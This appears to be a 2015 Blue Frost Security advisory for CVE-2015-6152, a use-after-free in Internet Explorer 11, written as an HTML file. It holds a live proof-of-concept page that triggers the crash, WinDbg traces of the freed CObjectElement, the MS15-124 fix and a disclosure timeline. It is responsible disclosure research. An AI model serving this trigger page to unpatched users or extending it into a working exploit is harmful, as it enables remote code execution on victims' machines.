@@ -1,0 +1,160 @@
+<!--
+Blue Frost Security GmbH
+https://www.bluefrostsecurity.de/               research(at)bluefrostsecurity.de
+BFS-SA-2015-003                                                 10-December-2015
+________________________________________________________________________________
+
+Vendor:                 Microsoft, http://www.microsoft.com
+Affected Products:      Internet Explorer
+Affected Version:       IE 11
+Vulnerability:          MSHTML!CObjectElement Use-After-Free Vulnerability
+CVE ID:                 CVE-2015-6152
+________________________________________________________________________________
+
+I.   Impact
+
+This vulnerability allows the execution of arbitrary code on vulnerable
+installations of Microsoft Internet Explorer. User interaction is required to
+exploit this vulnerability in that the target must visit a malicious page or
+open a malicious file.
+
+________________________________________________________________________________
+
+II.  Vulnerability Details
+
+Microsoft Internet Explorer 11 is prone to a use-after-free vulnerability in
+the MSHTML!CTreeNode::ComputeFormatsHelper function. The analysis was performed
+on Internet Explorer 11 running on Windows 7 SP1 (x64).
+
+The following HTML page can be used to reproduce the issue:
+-->
+
+<!DOCTYPE HTML>
+<html>
+<meta http-equiv="X-UA-Compatible" content="IE=8" />
+<style>
+    small{ -ms-block-progression: lr; -ms-filter: "vv"; }
+</style>
+<script>
+    function trigger() { document.execCommand("JustifyLeft"); }
+</script>
+<nolayer>blue<small>frost</small>
+<applet><tt>security</applet>
+<script>trigger();</script>
+</html>
+
+<!--
+With page heap enabled and the Memory Protect feature turned off, visiting
+that page results in the following crash:
+
+(2d4.830): Access violation - code c0000005 (!!! second chance !!!)
+eax=09b09e90 ebx=125b4e60 ecx=00000000 edx=6e9fedf0 esi=0f552fa0 edi=0f552fa0
+eip=6dfcc19b esp=097fb520 ebp=097fc1f0 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+MSHTML!CTreeNode::ComputeFormatsHelper+0x53:
+6dfcc19b f7402400000300  test    dword ptr [eax+24h],30000h ds:002b:09b09eb4=????????
+
+0:007> !heap -p -a @eax
+    address 09b09e90 found in
+    _DPH_HEAP_ROOT @ 9b01000
+    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
+                                    9b01f04:          9b09000             2000
+    748090b2 verifier!AVrfDebugPageHeapFree+0x000000c2
+    77e61b1c ntdll!RtlDebugFreeHeap+0x0000002f
+    77e1ae8a ntdll!RtlpFreeHeap+0x0000005d
+    77dc2b65 ntdll!RtlFreeHeap+0x00000142
+    758814ad kernel32!HeapFree+0x00000014
+    6d92d219 MSHTML!MemoryProtection::CMemoryProtector::ProtectedFree+0x00000122
+    6dc46583 MSHTML!CObjectElement::`vector deleting destructor'+0x00000023
+    6dfce0db MSHTML!CElement::PrivateRelease+0x0000027e
+    6d98953d MSHTML!CObjectElement::DeferredFallback+0x0000033d
+    6d96e1b3 MSHTML!GlobalWndOnMethodCall+0x0000017b
+    6d95577e MSHTML!GlobalWndProc+0x0000012e
+    770762fa user32!InternalCallWinProc+0x00000023
+    77076d3a user32!UserCallWinProcCheckWow+0x00000109
+    770777c4 user32!DispatchMessageWorker+0x000003bc
+    7707788a user32!DispatchMessageW+0x0000000f
+    6ebfa7b8 IEFRAME!CTabWindow::_TabWindowThreadProc+0x00000464
+    6ec38de8 IEFRAME!LCIETab_ThreadProc+0x000003e7
+    76a9e81c iertutil!CMemBlockRegistrar::_LoadProcs+0x00000067
+    747b4b01 IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x00000094
+    7588336a kernel32!BaseThreadInitThunk+0x0000000e
+    77dc9882 ntdll!__RtlUserThreadStart+0x00000070
+    77dc9855 ntdll!_RtlUserThreadStart+0x0000001b
+
+We can see that a freed CObjectElement object is accessed in the
+MSHTML!CTreeNode::ComputeFormatsHelper function. If we take a look at the
+memory just before the CObjectElement destructor is called, we can see where
+the object was initially allocated.
+
+0:007> bu MSHTML!CObjectElement::~CObjectElement
+0:007> g
+Breakpoint 0 hit
+eax=6daf6b10 ebx=00000000 ecx=0980de90 edx=0f834bb0 esi=0980de90 edi=094bc324
+eip=6dc4658f esp=094bc310 ebp=094bc318 iopl=0         nv up ei ng nz na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000287
+MSHTML!CObjectElement::~CObjectElement:
+0:007> !heap -p -a poi(@esp+4)
+    address 09b09e90 found in
+    _DPH_HEAP_ROOT @ 9b01000
+    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
+                                 9b01f04:          9b09e90              170 -          9b09000             2000
+          MSHTML!CObjectElement::`vftable'
+    74808e89 verifier!AVrfDebugPageHeapAllocate+0x00000229
+    77e6134e ntdll!RtlDebugAllocateHeap+0x00000030
+    77e1b16e ntdll!RtlpAllocateHeap+0x000000c4
+    77dc2fe3 ntdll!RtlAllocateHeap+0x0000023a
+    6daf6a27 MSHTML!CObjectElement::CreateElement+0x00000017
+    6e0423a4 MSHTML!CHtmParse::ParseBeginTag+0x000000b8
+    6df17172 MSHTML!CHtmParse::ParseToken+0x00000096
+    6df16a0f MSHTML!CHtmPost::ProcessTokens+0x000004c7
+    6dd8341b MSHTML!CHtmPost::Exec+0x00000207
+    6da308a8 MSHTML!CHtmPost::Run+0x0000003d
+    6da3080e MSHTML!PostManExecute+0x00000061
+    6da2727c MSHTML!PostManResume+0x0000007b
+    6da971f0 MSHTML!CDwnChan::OnMethodCall+0x0000002f
+    6d96e1b3 MSHTML!GlobalWndOnMethodCall+0x0000017b
+    6d95577e MSHTML!GlobalWndProc+0x0000012e
+    770762fa user32!InternalCallWinProc+0x00000023
+    77076d3a user32!UserCallWinProcCheckWow+0x00000109
+    770777c4 user32!DispatchMessageWorker+0x000003bc
+    7707788a user32!DispatchMessageW+0x0000000f
+    6ebfa7b8 IEFRAME!CTabWindow::_TabWindowThreadProc+0x00000464
+    6ec38de8 IEFRAME!LCIETab_ThreadProc+0x000003e7
+    76a9e81c iertutil!CMemBlockRegistrar::_LoadProcs+0x00000067
+    747b4b01 IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x00000094
+    7588336a kernel32!BaseThreadInitThunk+0x0000000e
+    77dc9882 ntdll!__RtlUserThreadStart+0x00000070
+    77dc9855 ntdll!_RtlUserThreadStart+0x0000001b
+
+________________________________________________________________________________
+
+III. Mitigation
+
+The issue was fixed in MS15-124 which should be installed to resolve the issue.
+
+________________________________________________________________________________
+
+IV.  Disclosure Timeline
+
+- 2015-08-04 Vulnerability reported to secure@microsoft.com
+- 2015-09-24 Microsoft confirms that they successufully reproduced the issue
+- 2015-12-08 Microsoft resolves issue in MS15-124
+
+________________________________________________________________________________
+
+Credit:
+Bug found by Moritz Jodeit of Blue Frost Security GmbH.
+________________________________________________________________________________
+
+Unaltered electronic reproduction of this advisory is permitted. For all other
+reproduction or publication, in printing or otherwise, contact
+research@bluefrostsecurity.de for permission. Use of the advisory constitutes
+acceptance for use in an "as is" condition. All warranties are excluded. In no
+event shall Blue Frost Security be liable for any damages whatsoever including
+direct, indirect, incidental, consequential, loss of business profits or
+special damages, even if Blue Frost Security has been advised of the
+possibility of such damages.
+
+Copyright 2015 Blue Frost Security GmbH. All rights reserved. Terms of use apply.
+-->
